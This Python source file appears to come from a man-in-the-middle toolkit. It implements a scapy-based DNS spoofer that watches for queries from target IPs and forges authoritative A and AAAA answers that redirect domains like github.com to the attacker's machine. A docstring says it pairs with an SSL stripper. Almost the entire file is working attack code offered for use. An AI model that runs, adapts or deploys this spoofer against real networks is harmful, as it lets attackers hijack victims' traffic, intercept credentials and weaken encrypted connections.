import logging
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, get_if_addr
from scapy.layers.inet6 import IPv6
import threading
import time

logger = logging.getLogger('DNSSpoofer')

try:
    from colorama import Fore, Style
except ImportError:
    class Fore:
        RED = YELLOW = GREEN = CYAN = BLUE = MAGENTA = ''

    class Style:
        RESET_ALL = ''


class DNSSpoofer:
    """DNS spoofer that integrates with SSL stripper for transparent MITM"""

    def __init__(self, interface, target_ips, dns_mapping=None, packet_handler=None, verbose=False):
        self.interface = interface
        self.target_ips = target_ips
        self.packet_handler = packet_handler
        self.running = False
        self.spoofed_count = 0
        self.spoofed_count = 0
        self.verbose = verbose

        # Get our IP from the interface
        self.attacker_ip = self._get_interface_ip()
        self.attacker_ipv6 = self._get_interface_ipv6()

        # Default domains to spoof (well this is just what im using for tests rnow)
        self.spoof_domains = dns_mapping or {
            'github.com': self.attacker_ip,
            'www.github.com': self.attacker_ip,
            'httpbin.org': self.attacker_ip,
            'www.httpbin.org': self.attacker_ip,
            'example.com': self.attacker_ip,
            'www.example.com': self.attacker_ip,
            'neverssl.com': self.attacker_ip,
            'www.neverssl.com': self.attacker_ip,
        }

        logger.info(
            f"DNS Spoofer initialized - redirecting to {self.attacker_ip} (IPv4)")

        if self.attacker_ipv6:
            logger.info(f"IPv6 address: {self.attacker_ipv6}")

    # TODO: rip DRY
    def _get_interface_ip(self):
        try:
            return get_if_addr(self.interface)
        except Exception:
            import socket
            import fcntl
            import struct
            import platform
            if platform.system() in ("Linux", "Darwin"):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                return socket.inet_ntoa(
                    fcntl.ioctl(
                        s.fileno(), 0x8915,  # SIOCGIFADDR
                        struct.pack(
                            '256s', self.interface[:15].encode('utf-8'))
                    )[20:24]
                )
            elif platform.system() == "Windows":
                import psutil
                for name, addrs in psutil.net_if_addrs().items():
                    if name == self.interface:
                        for a in addrs:
                            if a.family == socket.AF_INET:
                                return a.address
            return None

    def _get_interface_ipv6(self):
        try:
            import socket
            import psutil
            for name, addrs in psutil.net_if_addrs().items():
                if name == self.interface:
                    for a in addrs:
                        if a.family == socket.AF_INET6:
                            if not a.address.startswith('fe80'):
                                return a.address
                    # Return link-local if thats all we have
                    for a in addrs:
                        if a.family == socket.AF_INET6:
                            return a.address
        except:
            pass
        return None

    def start(self):
        """Start DNS spoofing"""
        if not self.packet_handler:
            logger.error("No packet handler provided!")
            return False

        if not self.attacker_ip:
            logger.error("Could not determine attacker IP!")
            return False

        self.running = True

        # Add our DNS filter with high priority
        self.packet_handler.add_filter(self._dns_filter, priority=100)

        logger.info("[VONGOLE] DNS Spoofing active")

        if self.verbose:
            logger.info(
                f"DNS Spoofer: Redirecting domains to {self.attacker_ip}")

            if self.attacker_ipv6:
                logger.info(f"IPv6 redirecting to: {self.attacker_ipv6}")

            logger.info(
                f"Spoofed domains: {', '.join(self.spoof_domains.keys())}")
            logger.info(f"Target IPs: {', '.join(self.target_ips)}")

        return True

    def stop(self):
        """Stop DNS spoofing"""
        self.running = False
        logger.info(
            f"DNS Spoofer stopped - spoofed {self.spoofed_count} queries")

    def _dns_filter(self, packet):
        """Process DNS queries and inject fake responses - NOW WITH IPv6"""
        try:
            if packet.haslayer(DNS) and packet[DNS].qr == 0:
                transport = "unknown"
                src_ip = "unknown"

                if packet.haslayer(IP):
                    transport = "IPv4"
                    src_ip = packet[IP].src
                elif packet.haslayer(IPv6):
                    transport = "IPv6"
                    src_ip = packet[IPv6].src

                logger.info(
                    f"[DEBUG] Saw DNS query via {transport} from {src_ip}")

                # Extra debug for IPv6
                if packet.haslayer(IPv6):
                    logger.info(
                        f"[DEBUG] IPv6 src: {packet[IPv6].src} dst: {packet[IPv6].dst}")

            # Check if it's a DNS query (works for both IPv4 and IPv6)
            if (packet.haslayer(DNS) and
                packet[DNS].qr == 0 and  # Query, not response
                packet.haslayer(UDP) and
                    packet[UDP].dport == 53):  # DNS port

                # NEW: Check source IP for both IPv4 and IPv6
                src_ip = None
                if packet.haslayer(IP):
                    src_ip = packet[IP].src
                elif packet.haslayer(IPv6):
                    src_ip = packet[IPv6].src

                # Check if from one of our targets (now a list)
                if src_ip not in self.target_ips:
                    return False

                # Get queried domain
                if packet.haslayer(DNSQR):
                    qname = packet[DNSQR].qname
                    qtype = packet[DNSQR].qtype  # NEW: Check query type

                    if isinstance(qname, bytes):
                        domain = qname.decode('utf-8').rstrip('.')
                    else:
                        domain = str(qname).rstrip('.')

                    # Check if we should spoof this domain
                    spoof_ip = None
                    for spoof_domain, ip in self.spoof_domains.items():
                        if domain == spoof_domain or domain.endswith('.' + spoof_domain):
                            spoof_ip = ip
                            break

                    if spoof_ip:
                        if qtype == 1:  # A record (IPv4)
                            if self.verbose:
                                logger.info(
                                    f"[VONGOLE] DNS SPOOFING (A): {domain} -> {spoof_ip}")
                            self.spoofed_count += 1

                            # Create IPv4 response
                            if packet.haslayer(IP):
                                dns_reply = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                                    DNS(
                                        id=packet[DNS].id,
                                        qr=1,
                                        aa=1,
                                        qd=packet[DNS].qd,
                                        an=DNSRR(
                                            rrname=packet[DNSQR].qname,
                                            type='A',
                                            ttl=300,
                                            rdata=spoof_ip
                                        )
                                )
                            else:  # IPv6 transport
                                dns_reply = IPv6(dst=packet[IPv6].src, src=packet[IPv6].dst) / \
                                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                                    DNS(
                                        id=packet[DNS].id,
                                        qr=1,
                                        aa=1,
                                        qd=packet[DNS].qd,
                                        an=DNSRR(
                                            rrname=packet[DNSQR].qname,
                                            type='A',
                                            ttl=300,
                                            rdata=spoof_ip
                                        )
                                )

                        # AAAA record (IPv6)
                        elif qtype == 28 and self.attacker_ipv6:
                            if self.verbose:
                                logger.info(
                                    f"[VONGOLE] DNS SPOOFING (AAAA): {domain} -> {self.attacker_ipv6}")
                            self.spoofed_count += 1

                            # Create IPv6 response
                            if packet.haslayer(IP):
                                dns_reply = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                                    DNS(
                                        id=packet[DNS].id,
                                        qr=1,
                                        aa=1,
                                        qd=packet[DNS].qd,
                                        an=DNSRR(
                                            rrname=packet[DNSQR].qname,
                                            type='AAAA',
                                            ttl=300,
                                            rdata=self.attacker_ipv6
                                        )
                                )
                            else:  # IPv6 transport
                                dns_reply = IPv6(dst=packet[IPv6].src, src=packet[IPv6].dst) / \
                                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                                    DNS(
                                        id=packet[DNS].id,
                                        qr=1,
                                        aa=1,
                                        qd=packet[DNS].qd,
                                        an=DNSRR(
                                            rrname=packet[DNSQR].qname,
                                            type='AAAA',
                                            ttl=300,
                                            rdata=self.attacker_ipv6
                                        )
                                )
                        else:
                            return False  # Don't spoof other query types

                        send(dns_reply, iface=self.interface, verbose=0)
                        return True  # Drop original query

        except Exception as e:
            logger.debug(f"DNS filter error: {e}")

        return False  # dont block other packets
